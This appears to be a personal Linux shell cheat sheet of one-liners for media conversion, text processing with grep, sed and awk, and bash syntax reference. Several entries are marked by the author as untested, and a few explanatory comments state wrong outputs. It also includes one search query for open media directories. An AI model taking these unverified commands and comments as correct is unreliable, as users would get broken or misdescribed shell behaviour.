$> mplayer -cache 128 -tv driver=v4l2:width=176:height=177 -vo xv tv:// -noborder -geometry "95%:93%" -ontop | ffmpeg -y -f alsa -ac 2 -i pulse -f x11grab -r 30 -s `xdpyinfo | grep 'dimensions:'|awk '{print $2}'` -i :0.0 -acodec pcm_s16le output.wav -an -vcodec libx264 -vpre lossless_ultrafast -threads 0 output.mp4
##==========================================
## Convert a .ogv recording (eg from recordmydesktop in Gnome/Linux) into a .wmv (eg for playback in Windows)
$> ffmpeg -i input.ogv -qscale 0 output.wmv # convert .ogv to .wmv
##==========================================
## View online pdf documents in cli
## Probably will not work very well with scanned documents.
$> curl 'LINK' | pdftotext - - | less
##==========================================
## Print machine's ipv4 addresses
$> ifconfig | grep "inet addr" |  sed 's/.*inet \(.*\)$/\1/' | tail -n +2
##==========================================
## Convert PDF to JPG
## Without the bashisms and sed dependency. Substitutions quoted so that filenames with whitespace will be handled correctly.
$> for file in *.pdf; do convert -verbose -colorspace RGB -resize 800 -interlace none -density 300 -quality 80 "$file" "${file//.pdf/.jpg}"; done
##==========================================
## Search google.com on your terminal, Mac OSX friendly version of google function
$> function google { Q="$@";GOOG_URL='https://www.google.com/search?tbs=li:1&q=';AGENT="Mozilla/4.0";stream=$(curl -A "$AGENT" -skLm 10 "${GOOG_URL}${Q//\ /+}");echo "$stream" | grep -o "href=\"/url[^\&]*&amp;" | sed 's/href=".url.q=\([^\&]*\).*/\1/';}
##------------------------------------------
## Search open directories;
$> inurl:(htm|html|php|shtml|3bb|aspx) intitle:"index of" +(mov|mp3|mp4|wma|flac|mp4|m4v|avi) YOURSEARCHTERM
##==========================================
## do not search history by grepping ~/.bash_history, or repeatedly hitting the up arrow, instead use CTRL+r (or '/' in vi-mode) for search-as-you type. You can immediately run the command by pressing Enter.
$> CTRL+r
##==========================================
## Convert virtually any video into a DVD-valid MPEG2 stream
$> mencoder -oac lavc -ovc lavc -of mpeg -mpegopts format=dvd -vf  displayscale=720:480,harddup -srate 48000 -af lavcresample=48000 -lavcopts codec=mpeg2video:vrc_buf_size=1835:vrc_maxrate=9800:vbitrate=5000:keyint=18:aspect=16/9:acodec=ac3:abitrate=192 -ofps 30000/1001 -o output.mpg input.extension
## Options you might want to change:
## scale: 720:480 for NTSC, 720:576 for PAL
## ofps: 30000/1001 for NTSC, 25 for PAL
## aspect: 16/9 or 4/3 depending on your video
##==========================================
## Record a screencast as an mpeg
## Use the command below to record a screencast and save it as an mpeg:
$> ffmpeg -f x11grab -s 800x600 -i :0.0 /tmp/screencast.mpg
##==========================================
## ???WORKING???Create a script of the last executed command
## echo -e option uses regular expressions
#$> echo -e "#!/bin/bash" & echo "!!" > script.sh
##==========================================
## Search for a string inside all files in the current directory
$> grep -RnsI --color=auto <pattern> *
##==========================================
## Beyond grep
$> sudo apt-get install ack-grep
##  _   /|
##  \'o.O'
##  =(___)=
##    U    ack!
$> ack-grep <pattern>
##==========================================
## Draw a cow with a speech bubble, saying something.
$> cowsay "$(uname) is cool"
##  ______________
## < Linux is cool >
##  --------------
##         \   ^__^
##          \  (oo)\_______
##             (__)\       )\/\
##                 ||----w |
##                 ||     ||
##------------------------------------------
## Show all cows installed
$> for i in /usr/share/cowsay/cows/*.cow; do cowsay -f $i "$i"; done
## Random cow says fortune
$> fortune | cowsay -f $(ls /usr/share/cowsay/cows/| sed 's/ /\n/g' | sed -e '/^$/d'| shuf -n1)
##==========================================
## Simple stopwatch
$> time read
$> <ctrl-d>
##==========================================
## Command line music player
$> sudo apt-get install cmus
$> cmus
## :add ~/Downloads/Music
## 1-player, 7-help, c-pause, b-next, s-shuffle
##==========================================
## Convert directory of videos to MP4 in parallel
## install Handbrake from http://handbrake.fr/
$> for INPUT in *.avi ; do echo "${INPUT%.avi}" ; done | xargs -i -P9  HandBrakeCLI -i "{}".avi -o "{}".mp4
## The first three bits ("for INPUT...done |") lists the AVI files in the current directory, then uses a Bash function to strip off the suffix. It then sends each video file name to the next part.
## The next part of the command (| xargs ...) runs our converter in parallel. The "-i" flag says take each input (video file name) and stick it in the "{}" parts of the xargs command. The parallel option lets us run up to 9 commands at the same time ("-P9").
## The last part (HandBrakeCLI -i "{}".avi -o "{}".mp4) converts a single video to MP4 format. The two open-close curly braces are replaced with xargs, once per input video file. The first run through will be "HandBrakeCLI -i "input1".avi -o "input1".mp4", next will be "HandBrakeCLI -i "input2".avi -o "input2".mp4", etc.
## Limitations
## Converting videos in parallel is confusing as Handbrake overwrites the status for every file -- ignore the screen.
##==========================================
## ??create a set of backed up .txt files with the current date added at the end of the file:
## ls *txt | sed "s/.*/cp & &.$(date "+%Y%m%d")/"
##==========================================
## Selective content replace on files. For example to replace '<?' with '<?php' in all PHP files:
$> find . -name '*.php' -exec sed -ie 's#<?#<?php#' {} \;
##==========================================
## Mass-renaming files using find and sed:(this example will rename all .php3 files to .php)
$> find -name "*.php3" | sed 's/\(.*\).php3$/mv "&" "\1.php"/' | sh
##==========================================
## multiple command output into a single program:
$> diff -u <(ls -c1 dir_1) <(ls -c1 dir_2)
## Will show you a diff of files in the root of dir_1 and dir_2
##==========================================
## Burn DVD
$> wodim -eject -tao  speed=2 dev=/dev/sr1 -v -data myiso.iso
$> growisofs -dvd-compat -Z /dev/sr1=myiso.iso
##==========================================
## Make a contact sheet montage of set of images
$> montage -verbose  -background '#000000' -fill 'gray' -define jpeg:size=600x600 -geometry 600x600+2+2 photoname_{125304..130339}_HDR.jpg contactsheetmontage.jpg
##==========================================
## Video editing
$> videnctool -compose --file=vid1.avi --start=00:00:30:12 --end=00:01:45:00 --file=vid2.avi --start=00:05:00:00 --end=00:07:12:25 --file=mypicture.png --duration=00:00:02:00 --file=vid3.avi --start=00:02:00:00 --end=00:02:45:10 --output=editedvid.avi
##==========================================
## Get a qrcode for a given string from qrenco.de
$> echo "YourStringHere" | curl -F-=\<- qrenco.de
##==========================================
## Weather forcast
## San Francisco Mexico
$> curl wttr.in/"san francisco"
## San Francisco USA
$> curl wttr.in/"94114"
##==========================================
## #######################################################
## ##    END Use
## #######################################################
##
##
##
## ###################################################################
## ##    BASH
## ###################################################################
## Shell
##------------------------------------------
##==========================================
## Make changes in .bashrc immediately available
$> builtin exec bash
$> bashrc-reload() { builtin exec bash ; }
##==========================================
## Clear Screen
$> printf "\033c"
##==========================================
## ####################################
## ##    Bash Sample Scripts
## ####################################
##------------------------------------------
## Sample script with; var if then else elif fi
$> cat elseif.sh << EOF
#!/bin/bash
echo -n "Enter a number: "
read VAR
if [[ $VAR -gt 10 ]]
then
echo "Variable is greater than 10."
elif [[ $VAR -eq 10 ]]
then
echo "Variable is equal to 10."
else
echo "Variable is less than 10."
fi
EOF
##---------------------------------------
## Sample script with nested; var if then else fi
$> #!/bin/bash
$> echo -n "Enter the first number: "
$> read VAR1
$> echo -n "Enter the second number: "
$> read VAR2
$> echo -n "Enter the third number: "
$> read VAR3
$>
$> if [[ $VAR1 -ge $VAR2 ]]
$> then
$>   if [[ $VAR1 -ge $VAR3 ]]
$>   then
$>     echo "$VAR1 is the largest number"
$>   else
$>     echo "$VAR3 is the largest number"
$>   fi
$> else
$>   if [[ $VAR2 -ge $VAR3 ]]
$>   then
$>     echo "$VAR2 is the largest number"
$>   else
$>     echo "$VAR3 is the largest number"
$>   fi
$> fi
##==========================================
## regex
##  $@ .[{()\*+?|^$             ## Special characters
##------------------------------------------
## Bash regular expressions
$>  if list; then list; [ elif list; then list; ] ... [ else list; ] fi
$>  while list; do list; done
$>  until list; do list; done
$>  test
$>  for name [ in word ] ; do list ; done
$>  for (( expr1 ; expr2 ; expr3 )) ; do list ; done
$>  ( expression )               ## Returns  the  value  of  expression.  This may be used to override the normal precedence of operators.
$>  ! expression                 ## True if expression is false.
$>  -d                           ## look for directory test if it is a directory
$>  if test -d /tmp/mydir        ## use test -d /path to test if dir exists
$>  if [ -d /tmp/mydir ]         ## use  [ -d /path ]to test if dir exists
## best practice to check file existence before creating them
$>  [ ! -f /tmp/testfile ] && touch /tmp/testfile          ## For File
$>  [ ! -d /tmp/mydir ] && mkdir -p /tmp/mydir             ## For Directory
$>  -f                           ## look for file test if it is a file
$>  -e                           ## checks for existence
$>  -z -n                        ## is null, is not null
$>  -r -w -x                     ## checks for read write execute permissions
$>  -eq                          ## equality test
$>  -ge -le                      ## greater, less than or equal test
$>  -h                           ## ?
$>  ||                           ## previous expression false
$>  &&                           ## previous expression true
$>  expression1 && expression2   ## True if both expression1 and expression2 are true.
$>  expression1 || expression2   ## True if either expression1 or expression2 is true.
$>  &                            ## Sends process background (so we can run multiple process parallel)
$>  ;                            ## Run multiple commands in one run, sequentially.
$>  \                            ## To type larger command in multiple lines
$>  &&                           ## Logical AND operator
$>  ||                           ## Logical OR operator
$>  !                            ## NOT operator ( Thanks for mgd@interbaun.com for giving good examples)
$>  |                            ## PIPE operator
$>  {}                           ## Command combination operator.
$>  ()                           ## Precedence operator
##==========================================
## operators:
$>  -n VAR                    ## True if the length of VAR is greater than zero.
$>  -z VAR                    ## True if the VAR is empty.
$>  STRING1 = STRING2         ## True STRING1 and STRING2 are equal.
$>  STRING1 != STRING2        ## True STRING1 and STRING2 are not equal.
$>  INTEGER1 -eq INTEGER2     ## True INTEGER1 and INTEGER2 are equal.
$>  INTEGER1 -gt INTEGER2     ## True INTEGER1 is greater than INTEGER2.
$>  INTEGER1 -lt INTEGER2     ## True INTEGER1 is less than INTEGER2.
$>  INTEGER1 -ge INTEGER2     ## True INTEGER1 is equal or greater than INTEGER2.
$>  INTEGER1 -le INTEGER2     ## True INTEGER1 is equal or less than INTEGER2.
$>  -h FILE                   ## True if the FILE exists and is a symbolic link.
$>  -r FILE                   ## True if the FILE exists and is readable.
$>  -w FILE                   ## True if the FILE exists and is writable.
$>  -x FILE                   ## True if the FILE exists and is executable.
$>  -d FILE                   ## True if the FILE exists and is a directory.
$>  -e FILE                   ## True if the FILE exists and is a file, regardless of type (node, directory, socket, etc.).
$>  -f FILE                   ## True if the FILE exists and is a regular file (not a directory or device).
## Use the = operator with the test [ command == operator with the [[ command for pattern matching.
$> test [var1 = var2]   [[var1 == var2]]
$> [[ $VAR == *"Linux"* ]]    ## True if Linux is in string var with anything before or after it
##==========================================
## Character classes
$>  .                            ## any character except newline
$>  \w\d\s                       ## word, digit, whitespace
$>  \W\D\S                       ## not word, digit, whitespace
$>  [abc]                        ## any of a, b, or c
$>  [^abc]                       ## not a, b, or c
$>  [a-g]                        ## character between a & g
## Anchors
$>  ^abc$                        ## start / end of the string
$>  \b\B                         ## word, not-word boundary
## Escaped characters
$>  \.\*\\                       ## escaped special characters
$>  \t\n\r                       ## tab, linefeed, carriage return
## Groups & Lookaround
$>  (abc)                        ## capture group
$>  \1                           ## backreference to group #1
$>  (?:abc)                      ## non-capturing group
$>  (?=abc)                      ## positive lookahead
$>  (?!abc)                      ## negative lookahead
## Quantifiers & Alternation
$>  a*a+a?                       ## 0 or more, 1 or more, 0 or 1
$>  a{5}a{2,}                    ## exactly five, two or more
$>  a{1,3}                       ## between one & three
$>  a+?a{2,}?                    ## match as few as possible
$>  ab|cd                        ## match ab or cd
##==========================================
## Selected Bash Keystrokes
$> Ctrl-U                       ## Cuts everything to the left
$> Ctrl-W                       ## Cuts the word to the left
$> Ctrl-Y                       ## Paste the last thing to be cut
$> Ctrl-A                       ## Go to beginning of line
$> Ctrl-E                       ## Go to end of line
$> Ctrl-T                       ## Reverses the position of the character the cursor is on with the previous character
$> Ctrl-R                       ## Search history
##==========================================
## History
$> !$                           ## Matches last string of previous command
$> !!                           ## Matches previous command
$> !10                          ## Matches 10 commands ago
##==========================================
## Clear terminal
$> clear                        ## Scrolls up till can not see current text
$> reset                        ## Resets the terminal and removes all text
$> echo -ne '\033c'             ## Removes all text
##==========================================
## Brace expansion.
$> echo \"{These,words,are,quoted}\"   # " prefix and suffix
# "These" "words" "are" "quoted"
$> cat {file1,file2,file3} > combined_file
# Concatenates the files file1, file2, and file3 into combined_file.
$> cp file22.{txt,backup}
# Copies "file22.txt" to "file22.backup"
##==========================================
## Colour text variables to output colored text
## tput controls the look of output
## set the attributes you want to use
$>  bold=$(tput bold)
$>  under=$(tput smul)
$>  reverse=$(tput rev)
$>  R=$(tput setaf 1)
$>  G=$(tput setaf 2)
$>  Y=$(tput setaf 3)
$>  B=$(tput setaf 4)
$>  P=$(tput setaf 5)
$>  C=$(tput setaf 6)
$>  backgR=$(tput setab 1)
$>  backgG=$(tput setab 2)
$>  backgY=$(tput setab 3)
$>  backgB=$(tput setab 4)
$>  backgP=$(tput setab 5)
$>  backgC=$(tput setab 6)
$>  D=$(tput sgr0)
## Check out the bold or colored text
$> echo "${bold}Completed backup${D}! Continuing..."
$> echo "${R}Completed backup${D}! Continuing..."
$> echo "${G}Completed backup${D}! Continuing..."
$> echo "${B}Completed backup${D}! Continuing..."
## Combine
$> echo "${bold}${under}${R}Completed backup${D}! Continuing..."
$> echo "${bold}${under}${backgR}${B}Completed backup${D}! Continuing..."
##==========================================
## Special Variables
$>  $0                ## The name of the Bash script.
$>  $1 - $9           ## The first 9 arguments to the Bash script. (10th must be ${10})
$>  $#                ## How many arguments were passed to the Bash script.
$>  $@                ## All the arguments supplied to the Bash script.
$>  $?                ## The exit status of the most recently run process.
$>  $$                ## The process ID of the current script.
$>  $USER             ## The username of the user running the script.
$>  $HOSTNAME         ## The hostname of the machine the script is running on.
$>  $SECONDS          ## The number of seconds since the script was started.
$>  $RANDOM           ## Returns a different random number each time is it referred to.
$>  $LINENO           ## Returns the current line number in the Bash script.
##==========================================
## shell. regex. generic regular expression pattern language:
## Print regular expression patterns
$> function regexpattern() { echo '
$> ##===================================
$> ##Pattern         Pattern meaning
$>    no character    ## matches ""
$>    .               ## matches any character
$>    .*              ## matches any string
$>    c               ## matches "c"
$>    p1 p2           ## matches p1 then p2
$>    p1|p2           ## matches p1 or p2
$>    p*              ## matches "" or p repeated
$>    p+              ## matches p repeated, but not ""
$>    p?              ## matches p or ""
$>    p{n}            ## matches p repeated n times
$>    p{n,m}          ## matches p repeated n to m times
$>    .               ## matches any character
$>    [c1...cn]       ## matches $c_1$ or $c_2$ or ... or $c_n$
$>    [^c1...cn]      ## matches any char but $c_1$ or ... or $c_n$
$>    (p)             ## matches p, remembers submatch
$>    \n              ## matches string from nth submatch
$>    \b              ## matches a word boundary
$>    \w              ## matches a word character, e.g., alphanumeric
$>    \W              ## matches a nonword character, e.g., punctuation
$>    \s              ## matches a whitespace character, e.g., space, tab, return
$>    \S              ## matches a non-whitespace character, e.g., alphanumeric, punctuation
$>    \d              ## matches a digit character, i.e., 0-9
$>    \D              ## matches a non-digit character, e.g., alphanumeric, punctuation
$>    ^               ## matches start of line/string
$>    $               ## matches end of line/string
$>    [c1-c2]         ## matches $c_1$ through $c_2$
$> ##===================================
$> ## POSIX basic regular expressions, operators {}, (), +, | and ? must be escaped with \
$> ## BRE Pattern     Pattern meaning
$>    no character    ## matches ""
$>    c               ## matches "c"
$>    p1p2            ## matches p1 then p2
$>    p1\|p2          ## matches p1 or p2
$>    p*              ## matches "" or p repeated
$>    p\+             ## matches p repeated, but not ""
$>    p\?             ## matches p or ""
$>    p\{n\}          ## matches p repeated n times
$>    p\{n,m\}        ## matches p repeated n to m times
$>    .               ## matches any character
$>    [c1...cn]       ## matches $c_1$ or $c_2$ or ... or $c_n$
$>    [^c1...cn]      ## matches any char but $c_1$ or ... or $c_n$
$>    \(p\)           ## matches p, remembers submatch
$>    \n              ## matches string from nth submatch
$>    \b              ## matches a word boundary
$>    [[:word:]]      ## matches a word character, e.g., alphanumeric
$>    [[:space:]]     ## matches a whitespace character, e.g., space, tab, return
$>    [[:digit:]]     ## matches a digit character, i.e., 0-9
$>    [[:xdigit:]]    ## matches a hex digit character, i.e., A-F, a-f, 0-9
$>    [[:upper:]]     ## matches a upperspaced character
$>    [[:lower:]]     ## matches a lowerspaced character
$>    ^               ## matches start of line/string
$>    $               ## matches end of line/string
$>    [c1-c2]         ## matches $c_1$ through $c_2$
$> ##=================================== ' ; }
##==========================================
### shell. Short course in BASH
## zsh is not zero indexed, zsh arrays use 1-based indexing, so arrays will start with 1 not 0.
## http://matt.might.net/articles/bash-by-example/
### Variable
$> name="admin"                            ## Set variable name
$> (( num = 3 ))                           ## Set variable num, expression notation
$> echo ${name}                            ## Prints admin
$> echo ${num}                             ## Prints 3
### Arrays
$> foo=("a a a" "b b b" "c c c")           ## array foo, elements numbered starting at 0
$> echo ${foo[2]}                          ## prints c c c
$> echo $foo                               ## prints a a a b b b c c c
$> echo ${foo[*]}                          ## "$*" combines all arguments into a single string. prints a a a b b b c c c
$> bar=("${foo[@]}")                       ## set bar var to same as foo array, must have quote due to spaces in original array. "$@" requotes the individual arguments.
$> echo $bar                               ## prints a a a
$> echo ${bar[1]}                          ## prints b b b
$> echo ${#bar[*]}                         ## Number of items in array, prints 3
$> echo ${bar[1]}                          ## prints b b b
### Print arguments
$> echo $0                                 ## prints the script name
$> echo $1                                 ## prints the first argument
$> echo $9                                 ## prints the ninth argument
$> echo $10                                ## prints the first argument, followed by 0
$> echo ${10}                              ## prints the tenth argument
$> echo $#                                 ## prints the number of arguments
$> echo $?                                 ## holds the "exit status" of the previously executed process, exit status of 0 indicates the process "succeeded" without error
$> true                                    ## true is a program that always "succeeds,"
$> echo $?                                 ## prints 0
$> false                                   ## false is a program that always "fails"
$> echo $?                                 ## will never print 0; usually prints 1
$> echo $$                                 ## The process id of the current shell
### Replace in array
$> baz="I'm a cat, and she's cat."         ## set var baz
$> echo ${baz/cat/dog}                     ## replace first instance, prints "I'm a dog, and she's a cat."
$> echo ${baz//cat/dog}                    ## replace all instances, prints "I'm a dog, and she's a dog."
$> echo ${baz/cat}                         ## replace with nothing, prints "I'm a , and she's a dog."
$> echo ${baz}                             ## does not alter original, prints I'm a cat, and she's cat.
### Slice
$> echo ${baz:6:2}                         ## Slice string, start at 6 give 3 characters
$> array=(a b c d e f g h i j)             ## array
$> echo ${array:3:2}                       ## Slice array, prints d e
### Test var for data "-",":=","+","?"
$> name="admin"                            ## set var name
$> echo ${name}                            ## prints admin
$> echo ${name-test}                       ## Test if var has data if it does print data, if not print what in after operand "-". prints admin
$> unset name                              ## removes data from var foo
$> echo ${name-test}                       ## Test if var has data, if it does, print data, if not, print what in after operand "-". prints test
$> echo ${name:=admin2}                    ## Test if var has data, if it does, print data, if not, sets it to what is after operand ":="  prints admin2
### Indirect look-up
$> alpha=(a b c d e f g h i j k l m n)     ## Set an array
$> char=alpha[12]                          ## Set var to element in array alpha
$> echo ${char}                            ## prints alpha[12]
$> echo ${!char}                           ## Follow indirect lookup. Prints m
$> IFS=","                                 ## internal field separator will be put between each argument called after function called by "$*"
$> echo ${alpha[*]}                        ## Prints a b c d e f g h i j k l m n
### To create a literal string, use single quotes; to create an interpolated string, use double quotes, In intepolated strings, variables are converted to their values.
$> world=Earth
$> single='Hello, $world!'                 ## literal var
$> double="Hello, $world!"                 ## interpolated var
$> echo $single                            ## prints Hello, $world!
$> echo $double                            ## prints Hello, Earth!
$> arr=("a b"  " c d    e")
$> echo ${arr[*]}                          ## prints a b c d e
$> echo ${arr[@]}                          ## prints a b c d e
$> echo "${arr[*]}"                        ## prints a b  c d    e
$> echo "${arr[@]}"                        ## prints a b  c d    e
### Export
$> foo=42                                  ## var
$> export foo                              ## Now foo can be used by other scripts
### The command expr prints the result of arithmetic expressions
$> expr 3 + 12                             ## prints 15
$> expr 3 \* 12                            ## prints 36. expr 3 * 12 (probably) crashes: * expands to all files must \*
$> (( x = 3 * 12 )); echo $x               ## prints 36
$> echo $(( 3 * 12 ))                      ## prints 36
## declare -i variable, creates an explicit integer variable
$> declare -i number                       ## declare -i
$> number=2+4*10                           ## var
$> echo $number                            ## prints 42
### Redirect, Every process in Unix has access to three input/output channels by default: STDIN (standard input), STDOUT (standard output) and STDERR (standard error)
## use the < operator to dump the contents of a file into STDIN
$> grep foo < myfile                       ## prints out lines in myfile containing the word foo:
$> cat myfile > newfile                    ## Redirects one file into another
$> cat myfile >> newfile                   ## Append to end of file
## To specify the contents of STDIN literally, in a script, use the <<endmarker most use <<EOF
$> cat <<UNTILHERE
All of this printed,
since all of this is going into cat on STDIN.
UNTILHERE
## Redirect STADIN to a file
$> cat > file.txt << EOF
All of this writen,
since all of this is going into cat on STDIN redirected into a file.
EOF
## STDIN is channel 0, STDOUT is channel 1, while STDERR is channel 2.
## To redirect error output (STDERR), use the operator 2>
$> httpd 2> error.log                      ## writes errors from web daemon start-up to an error log
## STDOUT with backquotes ``
$> echo `date` `whoami` >> log             ## writes the date and the user to the log
$> echo $(date) $(whoami) >> log           ## writes the date and the user to the log
$> echo $(cat /home/$USER/test.txt)        ## print /home/$USER/Test info
$> echo 'File content is:' `<test.txt`     ## prints the contents of /home/$USER/test.txt. print user: Test info
## The special bash command exec can manipulate channels over ranges of commands:  exec
$>
## pipe redirect output of command through pipe | as input to another command
$> du -cks * | sort -rn | head             ## prints files in current dir in order of size of content
## Substitution. <(command) expands output of running command.
$> cat <(uptime) <(date) <(tail -1 event.log) >> main.log  ## appends uptime, date and last line of event.log onto main.log:
## Execute a command in the background
$> time-consuming-command &                ## Put command in background with &
## $! is last process pid
$> pid=$!                                  ## $! is last process pid
## wait for pid to finish then run command
$> wait $pid ; echo "Process $pid finished." ## wait for pid to finish then run command
## Execute a command, then if successful execute another with &&
$> first-command && command-dependent-on-first-command
## Globs and patterns * matches any string. ? matches a single character. [chars] matches any character in chars. [a-b] matches any character between a and b.
$> echo {0,2}{0,2}                         ## print 00 02 20 22
## fuction sub-routine. Syntax; function name() { command ; command ; }
$> function name() { command ; }
##==========================================
## #########################################################
## ##    Cool | Pipes
## #########################################################
## shell. pipes
##------------------------------------------
## Replace text in a line containing a pattern
$> | sed '/PATTERN/ { s/ORIGINAL/REPLACEMENT/; }'
##------------------------------------------
## Removes unsorted duplicate lines
$> | awk '!x[$0]++'
## OR
$> | awk '!visited[$0]++'
##------------------------------------------
## Remove duplicate lines whilst keeping empty lines and order
$> | awk '!NF || !seen[$0]++'
##------------------------------------------
## Removes unsorted duplicate lines
$> | awk '!visited[$0]++'
##------------------------------------------
## Drop first column of output by piping to this
$> | awk '{for(i=2;i<=NF;i++) printf("%s%s",$i,(i!=NF)?OFS:ORS)}'
## or
$> | awk '{ $1="";print}'
##------------------------------------------
## Strips everything before the ":" character.
$> | awk -F\: '{print $2}'
##------------------------------------------
## Replaces spaces with new lines
$> | sed 's/ /\n/g'
##------------------------------------------
## Removes new lines
$> | tr -d '\n'
## or
$> | sed ':a;N;$!ba;s/\n/ /g'
##------------------------------------------
## Replaces new lines with spaces
$> | tr '\n' ' '
##------------------------------------------
## Insert 4 blank spaces at beginning of each line (make page offset)
$> | sed 's/^/    /'
##------------------------------------------
## Substitute "foo" with "bar" ONLY for lines which contain "baz"
$> | sed '/baz/s/foo/bar/g'
##------------------------------------------
## Substitute "foo" with "bar" EXCEPT for lines which contain "baz"
$> | sed '/baz/!s/foo/bar/g'
##------------------------------------------
## Strip off everything before http on each line
$> | grep -o "http.\+"
##------------------------------------------
## Add a line of commas above the top line
$> | sed '1s/^/,,,,,,,\n/'
##------------------------------------------
## Grep AND ".*", OR "\|", NOT "-v"
$> | grep 'THIS' | grep 'THAT'      ## first this, then from those results, that
$> | grep -E 'THIS.*THAT'           ## AND
$> | grep 'THIS\|THAT'              ## OR
$> | grep -E 'THIS|THAT'            ## OR
$> | grep 'THIS'| grep -v 'THAT'    ## NOT
##------------------------------------------
## Strip everything but the second field on each line
#> man cut # remove sections from each line of files, -d --delimiter=DELIM, -f --fields=LIST
$> | cut -d ' ' -f 2
##------------------------------------------
## Remove blank lines, nothing between ^ beginning and $ end of line, delete ^to$
$> | sed -e '/^$/d'
##------------------------------------------
## Remove blank lines even with spaces or tabs
$> | sed '/^\s*$/d'
##------------------------------------------
## Change case
$> | tr [:upper:] [:lower:]
## or a range
$> | tr a-z A-Z
##------------------------------------------
## Display a Block of Text between Two Strings
$> | awk '/start-pattern/,/stop-pattern/'
##------------------------------------------
## Delete block of text between patterns
$> | sed '/start-pattern/,/stop-pattern/d'
##------------------------------------------
## Use sed to replace string between two lines.  Good for config files with multiple sections with similar config names and you only want to change config in one section, like in apache config
$> | sed '\%^Between Line Start%,\%^And Line End% s/change this/to that/'
##------------------------------------------
## Remove quotes "
$> | tr -d '"'
##------------------------------------------
## Display last line
$> | sed -n '$p'
##------------------------------------------
## Enable progress output, shows progress of a long process
$> | awk 'NR%1000==0{print NR>"/dev/stderr"}{print}'
##------------------------------------------
## Scrape for IP addresses
$> | grep -Eoa "\b(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b"  | grep -Ev "^0|\.0[0-9]|^10\.|^127\.|^169\.|^172\.(1[6-9]|2[0-9]|3[01])|^191.168.|^2(2[4-9]|3[0-9])|^2(4[0-9]|5[0-5])" | grep -v 255
##------------------------------------------
## Remove blank lines even with spaces or tabs
$> | sed '/^\s*$/d'
##------------------------------------------
## Remove duplicate lines whilst keeping empty lines and order
$> | awk '!NF || !seen[$0]++'
##------------------------------------------
## Appends to top of file
$> | sed '1s/^/YOURTEXT\n/'
##------------------------------------------
## Embed next line on the end of current line using sed (where X is the current line)
## N: On the current line, sed will display it on pattern space, plus a \n (new line); but s/\n//: Will get rid of new line displayed on pattern space, joining the current lines end with the start of the next line
$> | sed 'X{N;s/\n//;}'
##------------------------------------------
# Comment out all lines in a file beginning with string
$> | sed 's/^\(somestring\)/#\1/'
##------------------------------------------
## Comment out specified line of a file, Working?
$> | sed '<Your_line_number_here>s/\(.*\)/#\1/'
##------------------------------------------
## Delete trailing white space (spaces, tabs)
$> | awk '{sub(/[ \t]*$/, "");print}'
##------------------------------------------
## Delete leading white space
$> | awk '{sub(/^[ \t]+/, ""); print}'
##------------------------------------------
## Add some ++++ at the beginning of matching lines regexp
$> | awk '/regexp/{sub(/^/, "++++"); print;next;}{print}'
##------------------------------------------
## Print only lines of less than 80 characters
$> | awk 'length < 80'
##------------------------------------------
## Shuffle lines
$> | perl -MList::Util=shuffle -e 'print shuffle <>;'
## or
$> | shuf
## or random sort
$> | sort -R
##------------------------------------------
## Print it out to default printer
$> | lp
##------------------------------------------
## Remove whitespace
## Remove leading whitespace
$> | sed 's/^[ \t]*//'
## Remove trailing whitespace from each line
$> | sed 's/[ \t]*$//'
## Remove leading whitespace from file
$> | awk '!d && NF {sub(/^[[:blank:]]*/,""); d=1} d'
## Remove blank lines from end of file
$> | awk '/^[[:space:]]*$/{p++;next} {for(i=0;i<p;i++){printf "\n"}; p=0; print}'
##------------------------------------------
## Reverse order of lines
$> | sed '1!G;h;$!d'
##------------------------------------------
## Remove \r (carriage return) in a file. ie convert win to unix
$> | sed -i 's/\r//g'
##------------------------------------------
## Convert line to no spaces line with first letter capital
## Convert "this is a sentence to work with" to "ThisIsASentenceToWorkWith"
$> | sed -e 's/^./\U&/' -e 's/ ./\U&/g'  -e 's/ //g'
##------------------------------------------
## Add period to end of each line.
$> | sed 's/$/./g'
##------------------------------------------
## Repete charcter with grep, like aa, zucchini, and aardvark
$> | grep '\(.\+\)\1'
##------------------------------------------
## Repete patterns, like words; bonbon, cancan, and chichi. \1 refers back to the string matched by the first parenthesized submatch.
$> | grep '^\(.*\)\1$'
##------------------------------------------
## Repete patterns with egrep has less \, like words; bonbon, cancan, and chichi. \1 refers back to the string matched by the first parenthesized submatch.
$> | egrep '^(.*)\1$'
##------------------------------------------
## two different repeated strings, like; susurr
$> | grep '^\(.\+\)\1\(.\+\)\2$'
##------------------------------------------
## word is seven letters long, with a for second letter and x for the sixth.
$> | grep '^.a...x.$'
##------------------------------------------
## words that have an oo at least one letter before an ee, or an ee at least one character before an oo. Like: beefwood and bookkeeper
$> | egrep 'oo.+ee|ee.+oo'
##------------------------------------------
## Print body section og html ?? -E -n- f ???
$> | sed -E -n -f /<body>/,/<\/body>/ p
## ??? or ???
$> | sed -E -n -f :<body>:,:</body>: p
##------------------------------------------
## Delete comment lines beginning with #
$> | sed '/^#/d'
##------------------------------------------
## Encrypt with the Caeser cipher if all lower case:
$> | sed 'y/abcdefghijklmnopqrstuvwxyz/defghijklmnopqrstuvwxyzabc/'
## Decrypt with the Caesar cipher if all lower case:
$> | sed 'y/defghijklmnopqrstuvwxyzabc/abcdefghijklmnopqrstuvwxyz/'
##------------------------------------------
## Change names from "Last, First [Middle/Middle Initial.]" to "First [Middle/Middle Initial.] Last":
$> | sed 's/([A-Z][a-z]*), ([A-Z][a-z]*( [A-Z][a-z]*[.]?)?)/\2 \1/g'
##------------------------------------------
## Double-space a file.
$> | awk '1; { print "" }'
##------------------------------------------
## Another way to double-space a file.
$> | awk 'BEGIN { ORS="\n\n" }; 1'
##------------------------------------------
## Double-space a file so that no more than one blank line appears between lines of text.
$> | awk 'NF { print $0 "\n" }'
##------------------------------------------
## Number only non-blank lines in files.
$> | awk 'NF { $0=++a " :" $0 }; { print }'
##------------------------------------------
## Remove tailing slashes
$> | sed 's:/*$::'
##------------------------------------------
# remove newlines from specific lines in a file using sed
$> | sed '/pattern/N; s/\n//'
##------------------------------------------
## Replace sequences of the same characters with a single character. Heeeelloo -> Helo
$> | sed 's/\(.\)\1\+/\1/g'
##------------------------------------------
## Add the last column of numbers
$> |  awk '{print $NF}' | paste -sd+ - | bc
##------------------------------------------
## Remove all the lower case t from line. tr Match any digit [0-9]: [:digit:] Match any lowercase letters: [:lower:] Match all letters [:alpha:]
$> | tr -d t
##------------------------------------------
## Capitalize all t in line
